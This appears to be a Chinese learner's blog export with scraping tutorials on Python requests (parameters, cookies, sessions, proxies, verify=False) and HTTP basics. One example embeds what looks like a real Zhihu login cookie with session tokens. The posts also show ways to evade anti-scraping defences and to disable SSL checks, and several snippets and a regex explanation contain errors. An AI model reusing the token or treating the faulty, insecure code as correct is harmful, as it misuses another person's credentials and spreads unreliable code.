&quot;223.129.4.193&quot;,   &quot;url&quot;: &quot;http:&#x2F;&#x2F;www.httpbin.org&#x2F;get&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们成功的发起请求返回的结果中包括请求头，URL，IP等信息</p><p>当我们要在请求时增加参数时，使用下面的方法，我们使用一个字典来储存我要传递的参数，在get时添加就好</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'aaa'</span><span class="token punctuation">,</span><span class="token string">'age'</span><span class="token punctuation">:</span><span class="token number">22</span><span class="token punctuation">&#125;</span>r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://www.httpbin.org/get'</span><span class="token punctuation">,</span>params<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>传递后可以看到返回的时候多了两个参数</p><pre class="line-numbers language-none"><code class="language-none">&#123;  &quot;args&quot;: &#123;    &quot;age&quot;: &quot;22&quot;,     &quot;name&quot;: &quot;aaa&quot;  &#125;,   &quot;headers&quot;: &#123;    &quot;Accept&quot;: &quot;*&#x2F;*&quot;,     &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,     &quot;Host&quot;: &quot;www.httpbin.org&quot;,     &quot;User-Agent&quot;: &quot;python-requests&#x2F;2.22.0&quot;,     &quot;X-Amzn-Trace-Id&quot;: &quot;Root&#x3D;1-5f81860b-27efd9e81e182e3166e8e817&quot;  &#125;,   &quot;origin&quot;: &quot;223.129.4.193&quot;,   &quot;url&quot;: &quot;http:&#x2F;&#x2F;www.httpbin.org&#x2F;get?name&#x3D;aaa&amp;age&#x3D;22&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也就是说我们传递的url被自动构造成了一个带有get请求的url</p><p><img src="/images/image-20201010180105945.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsr<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://www.httpbin.org/get'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&lt;class &#39;str&#39;&gt;&#123;&#39;args&#39;: &#123;&#125;, &#39;headers&#39;: &#123;&#39;Accept&#39;: &#39;*&#x2F;*&#39;, &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;, &#39;Host&#39;: &#39;www.httpbin.org&#39;, &#39;User-Agent&#39;: &#39;python-requests&#x2F;2.22.0&#39;, &#39;X-Amzn-Trace-Id&#39;: &#39;Root&#x3D;1-5f8186e7-6fffeeeb0af3cfa32351c4ce&#39;&#125;, &#39;origin&#39;: &#39;223.129.4.193&#39;, &#39;url&#39;: &#39;http:&#x2F;&#x2F;www.httpbin.org&#x2F;get&#39;&#125;&lt;class &#39;dict&#39;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以看到格式变化</p><ul><li>抓取二进制数据</li></ul><p>当我们抓取网页的时候我们得到的返回是一个HTML文档，但当我们需要抓取图片，音乐等时，我们要知道，这些文件是二进制格式的</p><p>这里给出一个抓取图片的实例：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"https://github.com/favicon.ico"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这是抓取github的站点图标</p><p><img src="/images/image-20201010181453880.png"></p><p>我们将其保存就可以在文件夹中看到图标</p><p><img src="/images/image-20201010181554612.png"></p><ul><li>添加header</li></ul><p>使用header来传递头信息，比如我们防止反爬要更改User-Agent</p><ol start="2"><li>POST请求</li></ol><p>和get方式很像，只是是通过post向服务器端传输数据</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsdata<span class="token operator">=</span><span class="token punctuation">&#123;</span>    name<span class="token operator">=</span><span class="token string">'hhh'</span>    age<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">&#125;</span>r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://httpbin.org/post"</span><span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以得到如下返回：</p><pre class="line-numbers language-none"><code class="language-none">F:\python\python.exe F:&#x2F;python_work_place&#x2F;spider_test&#x2F;forward_test.py&#123;  &quot;args&quot;: &#123;&#125;,   &quot;data&quot;: &quot;&quot;,   &quot;files&quot;: &#123;&#125;,   &quot;form&quot;: &#123;    &quot;age&quot;: &quot;6&quot;,     &quot;name&quot;: &quot;hhh&quot;  &#125;,   &quot;headers&quot;: &#123;    &quot;Accept&quot;: &quot;*&#x2F;*&quot;,     &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,     &quot;Content-Length&quot;: &quot;14&quot;,     &quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;,     &quot;Host&quot;: &quot;httpbin.org&quot;,     &quot;User-Agent&quot;: &quot;python-requests&#x2F;2.22.0&quot;,     &quot;X-Amzn-Trace-Id&quot;: &quot;Root&#x3D;1-5f8810f4-71311a454c6c90486810fdfe&quot;  &#125;,   &quot;json&quot;: null,   &quot;origin&quot;: &quot;223.129.4.231&quot;,   &quot;url&quot;: &quot;http:&#x2F;&#x2F;httpbin.org&#x2F;post&quot;&#125;Process finished with exit code 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到我们使用form表单上传了我们的参数</p><ol start="3"><li>响应</li></ol><p>在请求成功后得到了响应，我们可以使用.text,.content等来获取响应内容，也可以获得cookie或者头参数等，实例如下：</p><p><img src="/images/image-20201015171728148.png"></p><p><img src="/images/image-20201015171800177.png"></p><h4 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h4><p>我们可以使用requests来模拟提交文件，比如</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token builtin">file</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'a.txt'</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>    <span class="token comment">#上传的file的文件格式</span>r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://httpbin.org/post"</span><span class="token punctuation">,</span>files<span class="token operator">=</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>就可以实现自动上传文件</p><p>同时还有对cookie的操作</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsheaders<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">'Cookie'</span><span class="token punctuation">:</span><span class="token string">'_zap=fc99e39d-d13b-4839-8cf0-76ec70f3bc83; _xsrf=7XVuHOKM3FdxZfQNpIXA3R5gO884m8GN; d_c0="ALAsIZyEKRCPTjrPS9wsjOspI-w5ABEmkvA=|1570444133"; __utmv=51854390.100--|2=registration_date=20180614=1^3=entry_date=20180614=1; __utma=51854390.138991721.1572940125.1576250154.1576303660.7; _ga=GA1.2.138991721.1572940125; z_c0="2|1:0|10:1591710317|4:z_c0|92:Mi4xblNSTkNnQUFBQUFBc0N3aG5JUXBFQ1lBQUFCZ0FsVk5iT0RNWHdDbjlOVGMtTVo2bUxkSlJrZ2dyeW94ZkxkMFN3|9cab263c34306c8af64178b0d9c9330f9871c4d5e26a8a9093b293ba98bed6bd"; tst=r; q_c1=40bb646872384d60882f2072981be334|1600770724000|1572940120000; Hm_lvt_98beee57fd2ef70ccdd5ca52b9740c49=1602345002,1602386153,1602467925,1602754438; SESSIONID=L40MZ7VrYxOQ4XYatS3x5LdGSxYLQSGAVv3KwP5QuFA; JOID=Wl0TBE7yjCkclRM2Yv28tZmR0Kd9s7sYU8IpYxGm-WVMo0ZiAHWZokyVHTRhx9EGtx0aSqDDvpjg5OZuY5JyOGU=; osd=VlkSAUr-iCgZkR8yY_i4uZ2Q1aNxt7odV84tYhSi9WFNpkJuBHScpkCRHDFly9UHshkWTqHGupTk5eNqb5ZzPWE=; Hm_lpvt_98beee57fd2ef70ccdd5ca52b9740c49=1602755346; KLBRSID=ed2ad9934af8a1f80db52dcb08d13344|1602755346|1602754433'</span><span class="token punctuation">,</span>    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36'</span><span class="token punctuation">&#125;</span><span class="token comment">#通过从浏览器中找到自己登陆后的cookie，复制到这里，同时修改user-agent就可以实现登陆知乎，如果没有User-Agent则会被反爬，得到400</span>r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"https://www.zhihu.com"</span><span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span>    <span class="token comment">#可以看出是字典格式</span><span class="token keyword">for</span> key<span class="token punctuation">,</span>value <span class="token keyword">in</span> r<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>key<span class="token operator">+</span><span class="token string">'=='</span><span class="token operator">+</span>value<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>会话维持</li></ol><p>session对象，让我们可以方便的维持一个会话，让我们对网站的后续操作更加便捷，使用session我们可以做到模拟同一个会话而不用考虑cookie问题，通常用于模拟登陆成功后的方便进行下一步操作</p><p><img src="/images/image-20201015181419450.png"></p><p><img src="/images/image-20201015181440585.png"></p><p>这里我们可以看到，不能获取到我们想要的cookie数据，为空，这就是因为这其实是两个会话，第二个会话并不能访问到第一个会话的cookie</p><p><img src="/images/image-20201015181618645.png"></p><p>这就是使用session就可以维持会话，可以得到最开始设置的cookie</p><ol start="4"><li>SSL证书验证</li></ol><p>当发送http请求时，会检查ssl证书，requests库使用verify参数来控制是否检查该证书，比如当我们访问12306时，因为其证书没有被认证，所以会返回一个非安全警告页面：**<em>现在验证12306并无证书问题，只是做一个例子**</em></p><p><img src="/images/image-20201019204917986.png"></p><p>要避免这个错误只需要在get请求中加上一个verify=False即可，</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://www.12306.cn"</span>r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>verify<span class="token operator">=</span>false<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样就可以输出正常状态码，但此时会有一个warning，我们可以屏蔽掉他</p><p><img src="/images/image-20201019205719862.png"></p><p><img src="/images/image-20201019205747410.png"></p><ol start="5"><li>代理设置</li></ol><p>很多时候对于我们简单的测试内容可以很轻易的爬取，但当开始大规模数据采集的时候很容易被网站反爬虫策略所阻止，对于频繁的大规模请求，可能弹出验证码，跳转登录，或者直接封ip。所以我们需要设置代理</p><p>对于requests库设置代理很简单，使用proxies参数设置代理，示例如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsproxies<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">"http"</span><span class="token punctuation">:</span><span class="token string">"http:127.0.0.1:1080"</span><span class="token punctuation">,</span>    <span class="token string">"https"</span><span class="token punctuation">:</span><span class="token string">"http:127.0.0.1:1000"</span><span class="token punctuation">&#125;</span>url<span class="token operator">=</span><span class="token string">"http://www.12306.cn"</span>r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>proxies<span class="token operator">=</span>proxies<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样就设置了代理服务器，这里的设置的是本地服务器的不同端口作为代理，</p><p>若代理要使用HTTP Basic Auth(http 基础认证)可以使用如下格式: <a href="http://user:password@host:port的格式如：">http://user:password@host:port的格式如：</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">proxies<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">"http"</span><span class="token punctuation">:</span><span class="token string">"http://admin:1232@127.0.0.1:1080"</span><span class="token punctuation">,</span>    <span class="token string">"https"</span><span class="token punctuation">:</span><span class="token string">"http://admin:1232@127.0.0.1:1000"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>requests也支持Sockts代理</p><p><img src="/images/image-20201019213834845.png"></p><ol start="6"><li>超时设置</li></ol><p>使用timeout参数，如果在规定时间内没有相应则报错，timeout是从发出请求开始计时，到响应返回服务器，</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://www.12306.cn"</span>r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#timeout为1s</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>默认为none，即没有超时限制</p><ol start="7"><li>身份认证</li></ol><p><img src="/images/image-20201019214817506.png"></p><p>有的时候会遇见这样的身份验证（http基础验证）</p><p><img src="/images/image-20201019215014634.png"></p><p><img src="/images/image-20201019215030603.png"></p><p>注意传的是元组</p><p><img src="/images/image-20201019215112039.png"></p><ol start="8"><li>prepared request</li></ol><p>当我们需要传递很多歌参数时直接在请求中添加参数代码结构不雅观<del>其实我觉得没问题</del></p><p>我们使用一个数据结构Prepared Request,将所有参数通过一个Request对象来表示。参考实例：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> requests <span class="token keyword">import</span> Request<span class="token punctuation">,</span>Sessionurl<span class="token operator">=</span><span class="token string">"http://www.zhihu.com"</span>s<span class="token operator">=</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">#实例化session对象</span>data<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"hhh"</span><span class="token punctuation">,</span>    <span class="token string">"age"</span><span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">&#125;</span>headers<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">"xxxxxxxxxxx"</span><span class="token punctuation">&#125;</span>req<span class="token operator">=</span>Request<span class="token punctuation">(</span><span class="token string">'POST'</span><span class="token punctuation">,</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token comment">#实例化Requset对象req，用于储存参数</span>pre<span class="token operator">=</span>s<span class="token punctuation">.</span>prepare_request<span class="token punctuation">(</span>req<span class="token punctuation">)</span>  <span class="token comment">#使用session的prepare_requests方法将其转化为一个prepare request对象</span>r<span class="token operator">=</span>s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>pre<span class="token punctuation">)</span>   <span class="token comment">#调用send，发送数据即可</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/image-20201019222233440.png"></p><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p>正则表达式是用于处理字符串的一系列特定语法，在爬虫以及其他领域有着很重要的作用</p><p>常用匹配规则：</p><blockquote><p>\w    匹配字母，数字以及下划线</p><p>\W    匹配不是字母，数字以及下划线的字符</p><p>\s        匹配任意空白字符串，等价于[\t\n\r\f]</p><p>\S        匹配任意非空字符串</p><p>\d        匹配任意数字，等价于[0-9]</p><p>\D        匹配任何非数字字符</p><p>\A        匹配字符串开头</p><p>\Z        匹配字符串结尾，如果存在换行则只匹配到换行前的结束字符串</p><p>\z        匹配字符串结尾，如果存在换行，同时还会匹配换行符</p><p>\G        匹配最后匹配完成的位置</p><p>\n        匹配一个换行符</p><p>\t        匹配一个制表符</p><p>^        匹配一行字符串的开头</p><p>$        匹配一行字符串的结尾</p><p>.        匹配任意字符串，除换行符，当re.DOTALL标记被指定，则可以匹配包括换行符的任意字符</p><p>[…]    用来表示一组字符，单独列出，比如[ahb]匹配a,m或者k</p><p>[^…]    不在[]中的字符，如[ ^a,b,c]匹配除a,b,c以外的字符</p><p>*         匹配0个或者多个表达式，</p><p>+        匹配1个前面或多个表达式</p><p>?        匹配0或1个前面的正则表达式定义的片段，非贪婪方式</p><p>{n}        精确匹配到n个前面的表达式</p><p>{n,m}    匹配n到m次由前面正则表达式定义的方式，贪婪方式</p><p>a|b        匹配a或b</p><p>( )        匹配括号内的表达式，也表示一个组</p></blockquote><p>对于re库来说有几个常用于正则表达式匹配的函数</p><h4 id="match"><a href="#match" class="headerlink" title="match"></a>match</h4><ul><li><p>第一个参数是正则表达字符串，第二个参数是需要匹配的字符串，从初始位置匹配，</p></li><li><p>当匹配成功后返回的对象一般调用两个方法，一个是group，会返回匹配到的字符串，如果在匹配的正则表达式中使用了()则小括号中匹配到的可以使用group(1),group(2)来表示，另一个方法是span，会表达出匹配到的字符串长度</p></li><li><p>要注意两个地方，当我们使用任意匹配时，有贪婪匹配和非贪婪匹配，</p><ul><li>贪婪:<code>.*</code>这里的.代表匹配任意字符一次，<em>代表匹配匹配前面的字符无限次，组合在一起就可以匹配任意多个字符了，这是一种贪婪匹配，意思是比如一个字符串：aaa 123a,我们想要匹配到他，使用.\</em>,^aaa/s.*(\d+)a$这里的想法是group(1)中能匹配到所有的数字，但最后发现只能匹配到一个3，就是因为是贪婪匹配，.*会尽可能多的匹配，1,2都在其中，只留了3给(\d),</li><li>非贪婪匹配就是<code>.*?</code>,这样匹配对上述的字符串就能匹配到想要的123，因为只要遇见了后面所需要的\d就停止匹配。</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爬虫前置</title>
      <link href="/2020/09/15/pa-chong-qian-zhi/"/>
      <url>/2020/09/15/pa-chong-qian-zhi/</url>
      
        <content type="html"><![CDATA[<h1 id="爬虫基础知识"><a href="#爬虫基础知识" class="headerlink" title="爬虫基础知识"></a>爬虫基础知识</h1><blockquote><p>小计：对于爬虫的学习主要是通过《python3网络爬虫开发实战》进行，在开始学习之前有本书有很多的依赖库或环境安装，可能有一些在最初始的学习中并不会用到，但还是基本都装上了，所以耗时挺久，<del>水了老久了</del>之后会写一个关于安装的环境等的小结</p></blockquote><h3 id="URI和URL"><a href="#URI和URL" class="headerlink" title="URI和URL"></a>URI和URL</h3><ul><li>URI被称作统一资源标志符（Uniform Resourse Identifier)</li><li>URL被称为统一资源定位符 (Uniform Resourse Locator)</li></ul><p>URI下包括了URL与URN（统一资源名称）（一般并不常用）</p><p>URL指定了唯一访问一个资源的链接</p><p>由于URN在互联网中运用并不多，所以几乎所有的URI都是URL</p><h3 id="超文本"><a href="#超文本" class="headerlink" title="超文本"></a>超文本</h3><p>简单说就是HTML的代码</p><h3 id="Http与Https"><a href="#Http与Https" class="headerlink" title="Http与Https"></a>Http与Https</h3><p>访问资源所需要的协议类型，是计算机网络的知识，两个都是应用层协议，通常还可以看到ftp，sftp等协议开头的URL</p><ul><li><p>http是超文本传输协议，现在最常用的是http1.1</p></li><li><p>https是在http的基础上加上了SSL服务，用于SSL加密确保安全（也是一个应用层协议）</p></li><li><p>现在更多的网站和APP等都使用的是https</p></li><li><p>http请求过程：详见计网，简单的就是本地请求，服务器响应请求</p><ul><li>可以在访问一个页面时f12看network，可以看到服务器返回给本地的文件</li><li><img src="/2020/09/15/pa-chong-qian-zhi/Users\87175\AppData\Roaming\Typora\typora-user-images\image-20200903233402223.png" alt="image-20200903233402223"><ul><li>其中的initiator是指请求源：标记请求是由哪一个对象或者进程发起的</li><li>waterfall：网络请求可视化瀑布流</li><li>点击其中一条可以看到更多的信息，比如referrer和referrer policy为判别策略</li></ul></li></ul><ol><li><p>get与post方法</p><ul><li><p>一般使用的两种请求方法，，不同点是get的请求参数在URL里而post请求的url不会包含这些数据。数据以表单形式进行传输，包含在请求体中</p></li><li><p>get最多提交1024字节的数据post没有限制</p></li><li><p>一般来说，登录时，需要提交用户名和密码，其中包含了敏感信息，使用 GET 方式请求的话，密码就会暴露在 URL 里面，造成密码泄露，所以这里最好以 POST 方式发送 上传文件时，由于文件内容比较大，也会选用 POST 方式</p><p><img src="/2020/09/15/pa-chong-qian-zhi/Users\87175\AppData\Roaming\Typora\typora-user-images\image-20200905231527886.png" alt="image-20200905231527886"></p><p><strong>这些其实都是计网内容，也算是一次复习</strong></p></li></ul></li><li><p>请求头</p><p>请求头用来说明服务器需要使用的附加信息，记录几个比较重要的</p><ul><li>Accept：请求报头域，指定客户端可接受信息类型</li><li>Accept-language：客户端可接受语言类型</li><li>Accept-Encoding： 客户单可接受编码</li><li>Host;指定请求资源的主机的IP及端口号 ，其内容为被请求的URL的原始服务器或网关的位置。</li><li>cookie：简单来说就是网站为了识别用户的存储在本地的数据，<strong>主要用于维持当前访问当前会话</strong> ，比如即使在关闭了网页但再打开依旧是登录状态，就是cookie在请求时又被发送过去了。服务器识别出了用户且是登录状态。</li><li>Referer：用于标识这个请求时从哪个页面发来的，服务器可以做来源统计以及防盗链接</li><li>User-Agent：简称AG，特殊的字符串头，让服务器识别客户的操作系统及版本，浏览器版本等信息，<em>爬虫加上此信息可以伪装浏览器，不加容易被识别</em> </li><li>Content-Type：互联网媒体类型，表示具体请求中的媒体类型信息（http中），比如text/html 代表的是HTML格式，image/gif 代表的是gif图片</li></ul><p>所以请求头很重要，是哦运管爬虫时大多需要请求头</p></li><li><p>请求体</p><ul><li>请求体承载POST方法时的表单数据，对于GET请求，请求体为空</li></ul></li></ol><p><img src="/2020/09/15/pa-chong-qian-zhi/Users\87175\AppData\Roaming\Typora\typora-user-images\image-20200909220842530.png" alt="image-20200909220842530"></p><p><img src="/2020/09/15/pa-chong-qian-zhi/Users\87175\AppData\Roaming\Typora\typora-user-images\image-20200909220929942.png" alt="image-20200909220929942"></p><p>爬虫中如果需要构造POST请求需要使用正确的Content-type</p><ol start="4"><li><p>响应码</p><p><strong>不做列举，常用的记住就行</strong> <del>可以写但没必要</del></p></li></ol><p>2,3,4,5开头的大概是啥记住就好，具体的可以查阅</p><ol start="5"><li>响应头<ul><li>包含了服务器的响应信息，说一些常用的头</li><li>Date：响应产生的时间</li><li>Last-Modified：指定资源最后的修改时间</li><li>Content-Encoding;指定内容的编码</li><li>Server：包含服务器的信息。包括名称和编号之类的</li><li>Content-type：文档类型</li><li>Set-cookie：设置cookie，告诉浏览器该内容要放在cookie中，下次请求携带cookie信息</li><li>Expires：指定响应时间，可以使代理服务器或浏览器将加载的内容存储到缓存中</li></ul></li><li>响应体<ul><li>响应的正文都在响应体中，做爬虫请求网页后，要解析的内容就是响应体</li><li>浏览器开发者工具中的preview就是网页源代码也就是响应体的内容太，是解析的目标</li></ul></li></ol></li></ul><h3 id="网页基础"><a href="#网页基础" class="headerlink" title="网页基础"></a>网页基础</h3><p>​    网页是HTML，css，javascript组成的，HTML是文本，css是结构，js是一种脚本语言，负责交互以及一些动画</p><ul><li>html:即超文本标记语言，使用标签来进行编写，各种标签的排列组合形成了网页</li><li>css：即层叠样式表，只有HTML不美观，使用css来进行帮助，在网页中一般会定义整个网页的样式规则，并写入一个css文件，在html文件中只需要用link标签引用写好的css文件就好了，定义了网页的格式</li><li>javascript：一般也是以单独的文件加载，使用script标签进行引入，定义了网页的行为</li></ul><p><strong><em>具体语法不在此赘述，前端学习无论是书籍还是网站都是很多的</em></strong></p><p><a href="https://www.bilibili.com/">https://www.bilibili.com/</a></p><p><a href="http://www.w3school.com.cn/">http://www.w3school.com.cn/</a></p><p><a href="http://www.runoob.com/">http://www.runoob.com/</a></p><ol><li><p>节点以及节点树的关系</p><p>在html中所有标签定义的内容都是节点，他们构成了一个HTML DOM树</p><ul><li>DOM是一种标准，定义了html，xml文档的标准</li><li>选择器：css使用选择器来定位节点</li></ul></li></ol><p>​    </p><p><img src="/2020/09/15/pa-chong-qian-zhi/Users\87175\AppData\Roaming\Typora\typora-user-images\image-20200910165216829.png" alt="image-20200910165216829"></p><h3 id="爬虫基础"><a href="#爬虫基础" class="headerlink" title="爬虫基础"></a>爬虫基础</h3><p>简单来说爬虫就是获取和保存信息的自动化程序</p><p>流程：</p><blockquote><ol><li>使用库来获取网页</li><li>提取信息（一般使用正则表达式，或者选择器以及Xpath）</li><li>保存信息（简单的是保存为txt，json，也可以保存到数据库里）</li></ol></blockquote><ul><li>抓取什么数据：最常见的是抓html源码，当然也有其他格式数据，只要是http，https协议的爬虫都可以爬取</li></ul><p>在使用urllib，requests库进行抓取时有的时候会出现实际的HTML代码和抓取的不一样，这是因为现在越来越多的网页是使用js来渲染，html是一个空壳，所以我们很多时候需要使用Selenium，Splash库来模拟js渲染</p><ul><li>静态网页以及动态网页</li><li>一个基础的.html文件放在安装了站点服务的服务器上就可以被访问了，这种简单的由html来编写的网页就是静态网页，加载快且编写简单，但是可维护性差。</li><li>动态网页可以解析URL中的参数，关联数据库呈现不同的内容</li></ul><h4 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h4><p>我们可以在f12里的application中的storage找到cookie，其中的字段值做一个简单介绍</p><ul><li>Name：一旦创建，名称不可更改</li><li>Value：cookie值，如果值为Unicode编码则需要为字符编码，如果为二进制数据则为base64编码</li><li>Domain：可以访问cookie的域名，如果设置为.zhihu.com结尾则所有以zhihu.com 结尾的域名都可以访问该cookie</li><li>Max Age：该cookie的失效时间</li><li>Path：该cookie的使用路径</li><li>size：大小</li><li>http字段：cookie的httponly属性，若是为true，则只有在http头中会带有此cookie信息而不能通过document.cookie来访问</li><li>secure：是否被安全传输</li></ul><p>cookie放在浏览器/磁盘中，（放在浏览器中关闭浏览器即cookie失效，磁盘中保存久）严格来说没有会话cookie和持久cookie的区别，只是由max age 或experires字段来决定，一些持久化登录网站就是把时间设置的长罢了。</p><h4 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h4><p>代理服务器，不过多赘述，爬虫需要代理，否则爬虫访问过快网站的反爬机制会有封ip 